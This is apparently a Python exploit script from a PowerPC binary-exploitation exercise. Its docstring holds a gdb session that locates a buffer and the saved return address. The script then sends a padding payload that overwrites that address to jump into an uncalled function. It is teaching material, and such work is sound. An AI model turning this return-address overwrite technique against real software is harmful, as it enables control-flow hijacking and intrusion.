#!/usr/bin/python

"""
(gdb) disassemble vulnerable 
Dump of assembler code for function vulnerable:
   0x100005b4 <+0>:	stwu    r1,-144(r1)
...
   0x10000608 <+84>:	lwz     r0,4(r11)
   0x1000060c <+88>:	mtlr    r0
   0x10000610 <+92>:	lwz     r31,-4(r11)
   0x10000614 <+96>:	mr      r1,r11
   0x10000618 <+100>:	blr
End of assembler dump.
(gdb) b vulnerable 
Breakpoint 1 at 0x100005c8: file src/02-overwrite-ret.c, line 11.
(gdb) b *0x10000608
Breakpoint 2 at 0x10000608: file src/02-overwrite-ret.c, line 16.
(gdb) c
Continuing.

Breakpoint 1, vulnerable () at src/02-overwrite-ret.c:11
11		printf("> ");
(gdb) p &buffer[0]
$1 = 0xffffdd98 "\377\377\335", <incomplete sequence \370>
(gdb) c
Continuing.

Breakpoint 2, 0x10000608 in vulnerable () at src/02-overwrite-ret.c:16
16	}
(gdb) p/x $r11+4
$3 = 0xffffde24
"""

import struct
import sys

from pwn import *

context(arch='powerpc', os='linux', endian='big', word_size=32)

binary_path = './bin/ppc/02-overwrite-ret'

saved_pc_addr = 0xffffde24
buffer_addr = 0xffffdd98

binary = ELF(binary_path)
not_called_addr = binary.symbols['not_called']

p = process(binary_path)
#p = gdb.debug([binary_path])

payload = ''
payload += 'a' * (saved_pc_addr - buffer_addr)
payload += p32(not_called_addr)

p.readuntil('> ')
p.write(payload)
p.interactive()
